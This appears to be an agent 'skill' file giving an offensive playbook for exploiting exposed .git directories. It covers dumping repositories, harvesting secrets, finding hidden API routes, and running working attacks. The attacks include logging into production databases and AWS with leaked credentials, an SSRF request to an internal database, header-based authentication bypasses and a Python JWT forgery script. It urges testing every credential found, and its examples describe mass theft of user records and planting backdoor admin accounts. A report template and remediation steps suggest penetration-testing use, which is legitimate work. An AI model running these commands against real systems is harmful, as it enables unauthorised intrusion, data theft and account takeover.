---
name: exposed-git-analysis
description: Comprehensive analysis of exposed Git repositories - extract source code, find secrets, analyze for vulnerabilities, discover hidden APIs, and exploit findings
---

# Exposed Git Repository Analysis

## Overview

When you discover an exposed `.git` directory, this is a CRITICAL finding that requires thorough analysis. Exposed Git repositories can reveal:
- Source code with vulnerabilities
- Hardcoded secrets, API keys, credentials
- Database connection strings
- Hidden/undocumented APIs
- Internal infrastructure details
- Business logic flaws

## Detection

### Check for Exposed .git Directory

```bash
# Basic check
curl -s https://target.com/.git/HEAD

# Should return: ref: refs/heads/main (or similar)

# Check if directory listing is enabled
curl -s https://target.com/.git/

# Check for common Git files
curl -s https://target.com/.git/config
curl -s https://target.com/.git/COMMIT_EDITMSG
curl -s https://target.com/.git/index
```

### Automated Detection

```bash
# Use git-dumper to extract repository
pip install git-dumper
git-dumper https://target.com/.git/ ./extracted-repo

# Alternative: use dvcs-ripper
perl dvcs-ripper.pl -v -u https://target.com/.git/

# Or use GitTools
./gitdumper.sh https://target.com/.git/ ./extracted-repo
```

## Repository Extraction

### Method 1: git-dumper (Recommended)

```bash
# Install
pip install git-dumper

# Extract repository
git-dumper https://target.com/.git/ ./target-repo

# This will:
# - Download all Git objects
# - Reconstruct the repository structure
# - Create a working Git repository
```

### Method 2: Manual Extraction

```bash
# Download Git objects manually
mkdir -p ./target-repo/.git
cd ./target-repo/.git

# Download essential files
curl -o HEAD https://target.com/.git/HEAD
curl -o config https://target.com/.git/config
curl -o index https://target.com/.git/index

# Download refs
mkdir -p refs/heads refs/tags
curl -o refs/heads/main https://target.com/.git/refs/heads/main

# Download objects (if accessible)
# Objects are stored in .git/objects/XX/YYYY... format
# You may need to brute-force or use directory listing
```

### Method 3: GitTools

```bash
# Clone GitTools
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper

# Run dumper
./gitdumper.sh https://target.com/.git/ ./extracted-repo

# Then use Extractor to recover files
cd ../Extractor
./extractor.sh ./extracted-repo ./recovered-files
```

## Secret Analysis

### 1. Search for Hardcoded Credentials

```bash
# Search for common patterns
cd ./target-repo

# API Keys
grep -r "api[_-]?key" --include="*.js" --include="*.py" --include="*.java" --include="*.php" --include="*.env" --include="*.config"
grep -r "apikey" --include="*.js" --include="*.py" --include="*.java" --include="*.php" --include="*.env" --include="*.config"

# AWS Keys
grep -r "AKIA[0-9A-Z]{16}" --include="*.js" --include="*.py" --include="*.java" --include="*.php" --include="*.env"
grep -r "aws[_-]?secret" --include="*.js" --include="*.py" --include="*.java" --include="*.php" --include="*.env"

# Database Credentials
grep -r "password" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"
grep -r "db[_-]?pass" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"
grep -r "database[_-]?url" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"
grep -r "mongodb://" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"
grep -r "postgres://" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"
grep -r "mysql://" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"

# JWT Secrets
grep -r "jwt[_-]?secret" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"
grep -r "secret[_-]?key" --include="*.env" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json"

# Private Keys
find . -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_dsa"
grep -r "BEGIN RSA PRIVATE KEY" --include="*.pem" --include="*.key"
grep -r "BEGIN DSA PRIVATE KEY" --include="*.pem" --include="*.key"
grep -r "BEGIN EC PRIVATE KEY" --include="*.pem" --include="*.key"
```

### 2. Use Automated Tools

```bash
# TruffleHog (recommended)
pip install trufflehog
trufflehog --json ./target-repo

# GitLeaks
docker pull zricethezav/gitleaks
docker run -v ./target-repo:/path zricethezav/gitleaks:latest detect --source="/path" --verbose

# Gitrob
git clone https://github.com/michenriksen/gitrob.git
cd gitrob
go build
./gitrob ./target-repo

# Detect-secrets
pip install detect-secrets
detect-secrets scan ./target-repo > .secrets.baseline
detect-secrets audit .secrets.baseline
```

### 3. Check Environment Files

```bash
# Look for .env files
find . -name ".env*" -o -name "*.env"

# Read each .env file
cat .env
cat .env.local
cat .env.production
cat .env.development
cat .env.staging

# Look for configuration files
find . -name "config.json" -o -name "settings.json" -o -name "application.yml" -o -name "application.properties"
```

### 4. Check Git History for Deleted Secrets

```bash
# Search entire Git history for secrets
git log --all --full-history --source --all -p | grep -i "password\|secret\|api_key\|token"

# Use trufflehog with history
trufflehog --json --since-commit=HEAD~100 ./target-repo

# Use git-secrets
git secrets --scan-history

# Manual search through commits
git log --all --oneline | head -20
git show <commit-hash> | grep -i "password\|secret\|api_key"
```

## Code Analysis

### 1. Identify Technology Stack

```bash
# Check package files
cat package.json  # Node.js
cat requirements.txt  # Python
cat pom.xml  # Java Maven
cat build.gradle  # Java Gradle
cat Gemfile  # Ruby
cat composer.json  # PHP

# Check for frameworks
grep -r "express\|fastify\|koa" package.json  # Node.js frameworks
grep -r "django\|flask\|fastapi" requirements.txt  # Python frameworks
grep -r "spring\|hibernate" pom.xml  # Java frameworks
```

### 2. Find Vulnerable Dependencies

```bash
# Node.js
npm audit
snyk test

# Python
pip-audit
safety check

# Java
mvn dependency-check:check
gradle dependencyCheckAnalyze

# Ruby
bundle-audit

# PHP
composer audit
```

### 3. Analyze Code for Vulnerabilities

```bash
# SQL Injection
grep -r "query\|execute\|prepare" --include="*.js" --include="*.py" --include="*.java" --include="*.php" | grep -v "parameterized\|prepared"

# XSS
grep -r "innerHTML\|document.write\|v-html" --include="*.js" --include="*.vue" --include="*.jsx" --include="*.tsx"

# Command Injection
grep -r "exec\|system\|popen\|spawn" --include="*.js" --include="*.py" --include="*.java" --include="*.php"

# File Operations
grep -r "readFile\|writeFile\|open\|fopen" --include="*.js" --include="*.py" --include="*.java" --include="*.php"

# Deserialization
grep -r "unserialize\|pickle.loads\|ObjectInputStream" --include="*.js" --include="*.py" --include="*.java" --include="*.php"

# Authentication/Authorization
grep -r "isAdmin\|role\|permission\|authorize" --include="*.js" --include="*.py" --include="*.java" --include="*.php"
```

### 4. Use Static Analysis Tools

```bash
# Semgrep (recommended)
pip install semgrep
semgrep --config=auto ./target-repo

# SonarQube
docker run -d --name sonarqube -p 9000:9000 sonarqube
# Then upload code to SonarQube UI

# Bandit (Python)
pip install bandit
bandit -r ./target-repo

# ESLint Security Plugin (JavaScript)
npm install -g eslint eslint-plugin-security
eslint --ext .js ./target-repo

# Brakeman (Ruby on Rails)
gem install brakeman
brakeman ./target-repo
```

## Hidden API Discovery

### 1. Find API Routes/Endpoints

```bash
# Node.js (Express)
grep -r "app.get\|app.post\|app.put\|app.delete\|router.get\|router.post" --include="*.js"

# Python (Flask/Django/FastAPI)
grep -r "@app.route\|@api_view\|@router" --include="*.py"

# Java (Spring)
grep -r "@RequestMapping\|@GetMapping\|@PostMapping" --include="*.java"

# PHP
grep -r "Route::\|router->" --include="*.php"

# Ruby on Rails
grep -r "get\|post\|put\|delete" config/routes.rb
```

### 2. Find Undocumented/Hidden Endpoints

```bash
# Look for admin routes
grep -r "admin\|internal\|debug\|test" --include="*.js" --include="*.py" --include="*.java" --include="*.php" | grep -i "route\|endpoint\|path"

# Look for commented-out routes
grep -r "//.*route\|#.*route\|/\*.*route" --include="*.js" --include="*.py" --include="*.java" --include="*.php"

# Look for backup/old routes
find . -name "*.bak" -o -name "*.old" -o -name "*.backup"
```

### 3. Test Discovered APIs

```bash
# For each discovered endpoint, test:

# 1. Authentication bypass
curl -X GET https://target.com/api/admin/users
curl -X GET https://target.com/api/admin/users -H "Authorization: Bearer "

# 2. IDOR
curl -X GET https://target.com/api/users/1 -H "Authorization: Bearer TOKEN"
curl -X GET https://target.com/api/users/2 -H "Authorization: Bearer TOKEN"

# 3. Parameter manipulation
curl -X GET "https://target.com/api/users?role=admin" -H "Authorization: Bearer TOKEN"

# 4. Mass assignment
curl -X POST https://target.com/api/users \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","isAdmin":true}'
```

## Exploitation Workflow

### Step 1: Extract and Analyze

```bash
# Extract repository
git-dumper https://target.com/.git/ ./target-repo

# Run automated secret scanning
trufflehog --json ./target-repo > secrets.json

# Run static analysis
semgrep --config=auto ./target-repo > vulns.json
```

### Step 2: Identify High-Value Findings

**Priority 1: Credentials**
- Database connection strings
- API keys (AWS, Stripe, Twilio, etc.)
- JWT secrets
- SSH private keys
- OAuth client secrets

**Priority 2: Hidden APIs**
- Admin endpoints
- Debug/test endpoints
- Internal APIs
- Backup endpoints

**Priority 3: Code Vulnerabilities**
- SQL injection
- Command injection
- File upload/download
- Deserialization
- Authentication bypass

### Step 3: Exploit Findings

**Example 1: Database Credentials**
```bash
# Found in .env:
# DB_HOST=prod-db.internal.company.com
# DB_USER=admin
# DB_PASSWORD=SuperSecret123!

# Try to connect (if accessible)
mysql -h prod-db.internal.company.com -u admin -p'SuperSecret123!'

# Or use SSRF to access internal database
curl "https://target.com/api/fetch?url=mysql://admin:SuperSecret123!@prod-db.internal.company.com:3306/"
```

**Example 2: AWS Credentials**
```bash
# Found in config.js:
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Configure AWS CLI
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# List S3 buckets
aws s3 ls

# List IAM users
aws iam list-users

# Check permissions
aws iam get-user
```

**Example 3: Hidden Admin API**
```bash
# Found in routes.js:
# app.get('/api/internal/admin/users', adminController.listUsers)

# Test endpoint
curl -X GET https://target.com/api/internal/admin/users

# If 401, try authentication bypass
curl -X GET https://target.com/api/internal/admin/users -H "X-Forwarded-For: 127.0.0.1"
curl -X GET https://target.com/api/internal/../admin/users
```

**Example 4: JWT Secret**
```bash
# Found in config.js:
# JWT_SECRET=my-super-secret-key-12345

# Forge admin token
python3 << 'EOF'
import jwt
import time

payload = {
    "user_id": 1,
    "username": "admin",
    "role": "admin",
    "exp": int(time.time()) + 3600
}

token = jwt.encode(payload, "my-super-secret-key-12345", algorithm="HS256")
print(token)
EOF

# Use forged token
curl -X GET https://target.com/api/admin/users \
  -H "Authorization: Bearer FORGED_TOKEN"
```

### Step 4: Document and Report

**Report Template:**

```
## Vulnerability: Exposed Git Repository with Hardcoded Credentials

### Description
The application exposes its Git repository at https://target.com/.git/, allowing unauthenticated access to source code, configuration files, and hardcoded credentials.

### Proof of Concept

1. **Repository Access:**
   ```bash
   curl -s https://target.com/.git/HEAD
   # Returns: ref: refs/heads/main
   ```

2. **Extracted Credentials:**
   - Database: `mysql://admin:SuperSecret123!@prod-db.internal.company.com:3306/production`
   - AWS Access Key: `AKIAIOSFODNN7EXAMPLE`
   - JWT Secret: `my-super-secret-key-12345`

3. **Exploitation:**
   ```bash
   # Connected to production database
   mysql -h prod-db.internal.company.com -u admin -p'SuperSecret123!'
   mysql> SHOW DATABASES;
   # Output: production, staging, development
   
   # Listed all users
   mysql> SELECT * FROM users;
   # Output: 10,000+ user records with emails, password hashes, personal data
   ```

### Impact
- **CRITICAL**: Full database access with admin privileges
- **CRITICAL**: AWS account compromise
- **HIGH**: Authentication bypass via forged JWT tokens
- **HIGH**: Source code disclosure revealing business logic and additional vulnerabilities

### Remediation
1. Remove .git directory from web root immediately
2. Rotate all exposed credentials (database, AWS, JWT secret)
3. Audit database access logs for unauthorized access
4. Review AWS CloudTrail for unauthorized API calls
5. Implement proper access controls on web server
6. Use environment variables instead of hardcoded credentials
```

## Common Mistakes to Avoid

❌ **DON'T:**
- Just report "Git repository exposed" without analysis
- Stop after finding one secret
- Assume credentials are invalid without testing
- Ignore commented-out code (may contain old credentials)
- Skip Git history (deleted secrets may still be there)

✅ **DO:**
- Extract and analyze the entire repository
- Search Git history for deleted secrets
- Test all discovered credentials
- Look for hidden/undocumented APIs
- Chain findings for higher impact (e.g., DB creds + SSRF = data exfiltration)
- Document full exploitation chain with proof

## Tools Reference

**Repository Extraction:**
- git-dumper: https://github.com/arthaud/git-dumper
- GitTools: https://github.com/internetwache/GitTools
- dvcs-ripper: https://github.com/kost/dvcs-ripper

**Secret Scanning:**
- TruffleHog: https://github.com/trufflesecurity/trufflehog
- GitLeaks: https://github.com/gitleaks/gitleaks
- Detect-secrets: https://github.com/Yelp/detect-secrets

**Static Analysis:**
- Semgrep: https://semgrep.dev/
- SonarQube: https://www.sonarqube.org/
- Bandit: https://github.com/PyCQA/bandit

## Real-World Impact Examples

**Case 1: Database Compromise**
- Exposed .git with MongoDB connection string
- Connected to production database
- Extracted 500,000 user records
- Impact: CRITICAL - Full data breach

**Case 2: AWS Account Takeover**
- Exposed .git with AWS credentials in config file
- Listed S3 buckets, found backup bucket
- Downloaded database backups with customer PII
- Impact: CRITICAL - Cloud infrastructure compromise

**Case 3: Authentication Bypass**
- Exposed .git with JWT secret in source code
- Forged admin JWT token
- Accessed admin panel, created backdoor admin account
- Impact: HIGH - Full application compromise

**Case 4: Hidden API Exploitation**
- Exposed .git revealed undocumented `/api/internal/debug/exec` endpoint
- Endpoint accepted command parameter and executed it
- Achieved RCE on production server
- Impact: CRITICAL - Full server compromise
